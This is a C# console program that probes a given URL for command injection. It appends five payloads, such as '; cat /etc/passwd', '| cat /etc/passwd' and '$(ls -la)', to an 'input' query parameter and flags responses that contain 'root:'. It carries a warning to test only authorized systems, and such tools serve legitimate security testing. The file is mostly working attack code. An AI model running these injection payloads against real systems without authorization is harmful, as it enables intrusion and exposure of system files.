// Usage: dotnet run -- <target_url>
// Example: dotnet run -- "http://localhost:3000/endpoint"
// WARNING: Use only on systems you own or have explicit authorization to test.

using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

class CmdInjectionTester
{
    const int DEFAULT_TIMEOUT_MS = 5000;

    static readonly List<string> payloads = new List<string>
    {
        "cat /etc/passwd",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "' && cat /etc/passwd",
        "$(ls -la)"
    };

    static void Usage(string exeName)
    {
        Console.WriteLine($"Usage: dotnet run -- <target_url>");
        Console.WriteLine($"Example: dotnet run -- \"http://localhost:3000/endpoint\"");
    }

    static async Task<HttpResponseMessage> GetWithTimeoutAsync(HttpClient client, string url, int timeoutMs)
    {
        using (var cts = new CancellationTokenSource())
        {
            cts.CancelAfter(timeoutMs);
            try
            {
                return await client.GetAsync(url, cts.Token).ConfigureAwait(false);
            }
            catch (OperationCanceledException) when (!cts.IsCancellationRequested)
            {
                throw new TimeoutException("Request timed out.");
            }
            catch (OperationCanceledException)
            {
                throw new TimeoutException("Request timed out.");
            }
        }
    }

    static async Task<bool> TestInjectionAsync(string targetUrl)
    {
        bool vulnerable = false;

        Console.WriteLine($"Testing command injection at {targetUrl}");

        using (var client = new HttpClient())
        {
            client.Timeout = TimeSpan.FromMilliseconds(DEFAULT_TIMEOUT_MS + 1000); // safety upper bound

            foreach (var payload in payloads)
            {
                try
                {
                    string separator = targetUrl.Contains("?") ? "&" : "?";
                    string encoded = HttpUtility.UrlEncode(payload);
                    string fullUrl = $"{targetUrl}{separator}input={encoded}";

                    Console.WriteLine($" -> Trying payload: {payload}");
                    HttpResponseMessage resp = null;

                    try
                    {
                        resp = await GetWithTimeoutAsync(client, fullUrl, DEFAULT_TIMEOUT_MS);
                    }
                    catch (TimeoutException)
                    {
                        Console.WriteLine($"   Payload \"{payload}\" timed out after {DEFAULT_TIMEOUT_MS} ms");
                        continue;
                    }

                    string text = await resp.Content.ReadAsStringAsync().ConfigureAwait(false);
                    string lower = (text ?? string.Empty).ToLowerInvariant();

                    bool containsRoot = lower.Contains("root:");
                    bool containsEtc = lower.Contains("/etc/passwd");

                    if ((containsRoot || containsEtc) && text.Length > 100)
                    {
                        Console.WriteLine($"[POSSIBLE VULN] payload \"{payload}\" returned suspicious output (status {(int)resp.StatusCode})");
                        vulnerable = true;
                    }
                    else
                    {
                        Console.WriteLine($"   Not obviously vulnerable (status {(int)resp.StatusCode}, length {text.Length})");
                    }
                }
                catch (HttpRequestException hre)
                {
                    Console.WriteLine($"   Payload \"{payload}\" error: {hre.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"   Payload \"{payload}\" unexpected error: {ex.Message}");
                }
            }
        }

        return vulnerable;
    }

    static async Task<int> Main(string[] args)
    {
        if (args.Length != 1)
        {
            Usage(AppDomain.CurrentDomain.FriendlyName);
            return 2;
        }

        string target = args[0];

        try
        {
            bool isVulnerable = await TestInjectionAsync(target);
            if (isVulnerable)
            {
                Console.WriteLine("\n[VULNERABLE] Command injection possible!");
                return 0;
            }
            else
            {
                Console.WriteLine("\nNo obvious command injection vectors detected.");
                return 0;
            }
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("Fatal error: " + ex);
            return 1;
        }
    }
}
